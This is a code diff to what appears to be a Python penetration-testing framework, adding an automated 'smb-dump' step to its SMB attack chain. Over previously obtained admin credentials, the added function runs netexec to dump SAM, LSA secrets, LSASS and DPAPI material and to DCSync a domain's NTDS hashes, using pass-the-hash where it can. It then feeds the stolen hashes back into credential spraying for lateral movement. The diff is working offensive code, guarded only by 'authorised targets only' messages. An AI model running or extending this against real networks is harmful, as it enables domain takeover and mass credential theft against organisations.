@@ -2223,6 +2223,20 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2al) smb-dump: credential material dumped (SAM/LSA/LSASS) or the domain (DCSync/NTDS)
+    if sid == "smb-dump":
+        dc = re.findall(r"^✗ DCSYNC (.+)$", output, re.M)
+        du = re.findall(r"^✗ DUMP (.+)$", output, re.M)
+        if dc:
+            shown = "; ".join(d.strip() for d in dc[:2])
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"DCSync — domain dumped: {shown}"[:140]}
+        if du:
+            shown = "; ".join(d.strip() for d in du[:2]) + (f" +{len(du) - 2}" if len(du) > 2 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"creds dumped: {shown}"[:140]}
+        return None
+
     # 2ak) smb-exec: command execution confirmed over admin creds → shell channel ready
     if sid == "smb-exec":
         hits = re.findall(r"^✗ EXEC (.+)$", output, re.M)
@@ -2932,7 +2946,7 @@ _EXPLOIT_STEPS = {
         # ── creds → exec / dump ──
         ("Spray creds & hashes (mind lockout)", "smb-spray"),
         ("Valid creds / hash → shell", "smb-exec"),
-        "Dump SAM / LSA / LSASS; DCSync",
+        ("Dump SAM / LSA / LSASS; DCSync", "smb-dump"),
         "Writable share → hash capture / payload",
         # ── land a shell & foothold ──
         "Spawn & upgrade an interactive shell",
@@ -9513,6 +9527,78 @@ def _tool_smb_exec(ip: str, port: int, proto: str) -> str:
     return f"Credential exec — {len(admins)} admin cred(s)  (channel confirm)\n\n" + "\n".join(lines)
 
 
+# ── SMB step 11: dump SAM / LSA / LSASS / DPAPI + DCSync (NTDS) ────────────────
+_SMBDUMP_DEADLINE = 360          # s — overall cap (NTDS can be slow)
+_SMBDUMP_MAX_STORE = 100         # ceiling on NT hashes written back to smb-creds
+
+
+def _tool_smb_dump(ip: str, port: int, proto: str) -> str:
+    """SMB step 11 tool: over the admin creds smb-spray/smb-exec proved, dump credential
+    material with netexec — SAM, LSA secrets, LSASS (lsassy) and DPAPI locally, plus DCSync
+    the domain (--ntds) on every admin host (fails cleanly off a DC). Read-only loot: nothing
+    is written to the target. Recovered NT hashes are saved back to smb-creds (feeding another
+    spray pass — the creds loop closes). Uses pass-the-hash when the secret is an NT hash. No
+    root. Raises without a confirmed admin cred. Authorised targets only."""
+    import time
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    if not nxc:
+        raise RuntimeError("netexec not found — install it to dump credentials")
+    admins = _gather_smb_admin()
+    if not admins:
+        raise RuntimeError("no confirmed admin creds — run smb-spray (r9) / smb-exec (r10) first")
+    deadline = time.time() + _SMBDUMP_DEADLINE
+
+    per_host, all_hashes = [], []                 # per_host: (host, nlocal, nclear, nntds)
+    for host, user, secret in admins:
+        if time.time() > deadline:
+            break
+        is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
+        auth = ["-u", user] + (["-H", secret] if is_hash else ["-p", secret])
+        _, loc = _smb_run([nxc, "smb", host, *auth, "--sam", "--lsa", "--dpapi",
+                           "-M", "lsassy"], 180)
+        if not re.search(r"\b445\b.*\[\+\]", loc):
+            continue
+        body = _nxc_body(loc)                     # strip the 'SMB ip 445 HOST' prefix + [+] banner
+        local = _parse_sam_dump(body)             # SAM / LSASS NT hashes
+        clear = [(u, p) for u, p in re.findall(r"([A-Za-z0-9._-]+\\[A-Za-z0-9._$-]+):([^\s:]{3,})", body)
+                 if not re.fullmatch(r"[a-fA-F0-9]{32}", p) and ":" not in p]
+        _, nt = _smb_run([nxc, "smb", host, *auth, "--ntds"], 180)   # DCSync — no-op off a DC
+        ntds = _parse_sam_dump(_nxc_body(nt))
+        if local or clear or ntds:
+            per_host.append((host, len(local), len(clear), len(ntds)))
+        for u, h in local:
+            all_hashes.append((host, u, h))
+        for u, h in ntds:
+            all_hashes.append((u.split("\\")[0] if "\\" in u else host, u.split("\\")[-1], h))
+
+    stored = 0                                    # write NT hashes back for another spray pass
+    if all_hashes:
+        blocks = _load_manual_block(ip, port, proto, "smb-creds")
+        for dom, user, h in all_hashes:
+            if stored >= _SMBDUMP_MAX_STORE:
+                break
+            line = f"! {user}:{h} @ dumped {dom} [{dom}]"
+            blocks.setdefault(dom, [])
+            if line not in blocks[dom]:
+                blocks[dom].append(line)
+                stored += 1
+        _save_manual_block(ip, port, proto, "smb-creds", blocks)
+
+    lines = [f"[*] {len(admins)} admin host(s) · {stored} NT hash(es) saved for re-spray"]
+    for host, nl, nc, nn in per_host:
+        if nn:
+            lines.append(f"✗ DCSYNC {host} → NTDS {nn} domain hash(es)")
+        if nl or nc:
+            bits = ", ".join(x for x in (f"{nl} SAM/LSASS hash(es)" if nl else "",
+                                         f"{nc} cleartext" if nc else "") if x)
+            lines.append(f"✗ DUMP {host} → {bits}")
+    if not per_host:
+        lines.append("· nothing dumped — creds may lack the rights, or were rotated")
+    else:
+        lines.append("· NT hashes saved to smb-creds (pass-the-hash → re-spray r9)")
+    return f"Credential dump / DCSync — {len(admins)} admin host(s)\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -9552,6 +9638,7 @@ _STEP_TOOLS = {
     "smb-dccve": ("DC-takeover CVE scan (ZeroLogon/noPac/PrintNightmare, detection only)", _tool_smb_dccve),
     "smb-spray": ("Credential spray across hosts (netexec, reuse/lateral → admin)", _tool_smb_spray),
     "smb-exec": ("Confirm command exec over admin creds (netexec -x → feeds foothold)", _tool_smb_exec),
+    "smb-dump": ("Dump SAM/LSA/LSASS/DPAPI + DCSync NTDS (netexec, admin creds)", _tool_smb_dump),
 }
 
 def _mins(seconds: int) -> str:
@@ -9606,6 +9693,7 @@ _STEP_TOOL_RUNS = {
     "smb-dccve":        ("netexec zerologon/nopac/printnightmare", f"{_mins(_SMBDCCVE_DEADLINE)} min"),
     "smb-spray":        ("netexec", f"{_mins(_SMBSPRAY_DEADLINE)} min"),
     "smb-exec":         ("netexec -x", f"{_mins(_SMBEXEC_DEADLINE)} min"),
+    "smb-dump":         ("netexec --sam/--lsa/--ntds", f"{_mins(_SMBDUMP_DEADLINE)} min"),
 }
 
 
@@ -9767,6 +9855,12 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ SMB version-RCE scan{RESET}{DIM} — detection only (nmap NSE + netexec), "
               f"no exploitation / no unsafe probes · {RESET}{YELLOW}authorized targets only{RESET}"
               f"{DIM} · deadline {_SMBVULN_DEADLINE // 60} min{RESET}")
+    if tool_key == "smb-dump":                    # deep loot over proven admin creds
+        na = len(_gather_smb_admin())
+        print(f"{DIM}   dumps SAM/LSA/LSASS/DPAPI + DCSync (--ntds) over {BOLD}{na}{RESET}{DIM} admin "
+              f"host(s) via {BOLD}netexec{RESET}{DIM} — read-only loot; {RESET}{YELLOW}LSASS/DCSync "
+              f"are EDR-noisy{RESET}{DIM} · dumped hashes re-fed to spray · {RESET}{YELLOW}authorised "
+              f"targets only{RESET}{DIM} · deadline {_SMBDUMP_DEADLINE // 60} min{RESET}")
     if tool_key == "smb-exec":                    # read-only exec confirm over proven admin creds
         na = len(_gather_smb_admin())
         print(f"{DIM}   confirms command exec over {BOLD}{na}{RESET}{DIM} proven admin cred(s) via "
